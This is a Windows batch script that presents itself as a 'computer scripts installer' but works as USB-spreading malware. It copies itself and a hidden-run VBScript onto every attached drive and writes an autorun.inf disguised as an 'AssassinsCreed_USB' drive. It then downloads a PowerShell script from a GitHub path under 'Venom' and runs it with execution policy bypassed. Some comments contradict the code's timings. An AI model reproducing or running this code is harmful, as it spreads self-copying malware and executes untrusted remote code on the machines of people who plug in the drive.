@echo off

@rem Computer scripts installer

@rem Enable error handling
setlocal enabledelayedexpansion
set logFile=%temp%\AutoRun.log

@rem Function to check internet connection
:check_internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    echo [ERROR] No internet connection detected. Retrying in 2 hours. >> %logFile%
    timeout /t 7200 >nul
    goto check_internet
)

@rem Function to check for USB drive
:check_drive
@rem Timeout period in seconds (e.g., 300 for 5 minutes)
set timeout_period=300
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo [INFO] USB drive detected on drive %%d. >> %logFile%
        goto Yes
    )
)

@rem If USB not found, wait for the specified timeout period and check again
echo [ERROR] No USB drive detected. Retrying in %timeout_period% seconds. >> %logFile%
timeout /t 100 >nul
goto check_drive

@rem If USB present, run payload
:Yes
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        @rem Wait for 10 minutes before changing the USB label
        timeout /t 60 >nul

        @rem Generate a random letter using PowerShell
        for /f %%i in ('PowerShell -Command "[char]([byte](Get-Random -Minimum 65 -Maximum 90))"') do set randomLetter=%%i

        @rem Change the USB label to "U$B_<random_letter>"
        label %%d: U$B_%randomLetter%
        if errorlevel 1 (
            echo [ERROR] Failed to change USB label on drive %%d. >> %logFile%
        ) else (
            echo [INFO] USB label changed to U$B_%randomLetter% on drive %%d. >> %logFile%
        )

        md "%%d:\system info"
        if errorlevel 1 (
            echo [ERROR] Failed to create hidden folder on drive %%d. >> %logFile%
        ) else (
            @rem attrib +h "%%d:\system info"
           @rem echo [INFO] Hidden folder created on drive %%d. >> %logFile%
        )

        copy "%~f0" "%%d:\system info\AutoRun.bat"
        copy "RunHidden.vbs" "%%d:\system info\RunHidden.vbs"
        echo [autorun] > "%%d:\system info\autorun.inf"
        echo label=AssassinsCreed_USB >> "%%d:\system info\autorun.inf"
        echo action=Open folder to view files >> "%%d:\system info\autorun.inf"
        echo open=explorer.exe >> "%%d:\system info\autorun.inf"
        echo [INFO] autorun.inf file created on drive %%d. >> %logFile%

        @rem Download DownloadAndExtract.ps1
        powershell.exe -Command "Invoke-WebRequest -Uri 'raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '%%d:\system info\Extract.ps1'"
        if errorlevel 1 (
            echo [ERROR] Failed to download Extract.ps1. >> %logFile%
        ) else (
            echo [INFO] Downloaded Extract.ps1. >> %logFile%
        )

        @rem Run DownloadAndExtract.ps1 using PowerShell
        powershell.exe -ExecutionPolicy Bypass -File "%%d:\system info\Extract.ps1"
        if errorlevel 1 (
            echo [ERROR] Failed to execute Extract.ps1. >> %logFile%
        ) else (
            echo [INFO] Executed Extract.ps1 successfully. >> %logFile%
        )
    )
)

@end
exit
